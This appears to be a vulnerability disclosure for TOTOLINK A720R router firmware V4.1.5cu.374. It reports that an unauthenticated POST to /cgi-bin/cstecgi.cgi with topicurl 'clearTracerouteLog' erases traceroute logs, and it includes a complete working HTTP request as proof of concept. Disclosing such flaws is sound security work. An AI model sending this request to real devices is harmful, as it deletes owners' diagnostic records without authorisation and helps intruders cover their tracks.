# Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/203/ids/36.html

# Affected version

V4.1.5cu.374

# Vulnerability details

The TOTOLINK A720R V4.1.5cu.374 firmware contains an ​​unauthorized traceroute log deletion vulnerability​​. This vulnerability occurs when a ​​POST request​​ is sent to `/cgi-bin/cstecgi.cgi` with the parameter `{"topicurl":"clearTracerouteLog"}`, allowing an attacker to ​​erase traceroute diagnostic logs without authentication​​.

# Poc

Traceroute logs are normally recorded. 

![图 0](img/9166f79d1c8a945b9d10562c88cf3aa96f52182619eb1db5d93257cc4c4c34ca.png)  

Send a request to clear the traceroute log.

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.140.79
Content-Length: 33
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.140.79
Referer: http://192.168.140.79/basic/index.html?time=1745238634622
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

{"topicurl":"clearTracerouteLog"}
```

![图 1](img/be1dd0fe27997ad8b316ec938d79565494904ded811f49879ad5f48b7477f008.png)  

The traceroute log is cleared.

![图 2](img/db11419b265e73965c91ae1e362a997b31a4d9057c8c3f400b9270616afce102.png)  
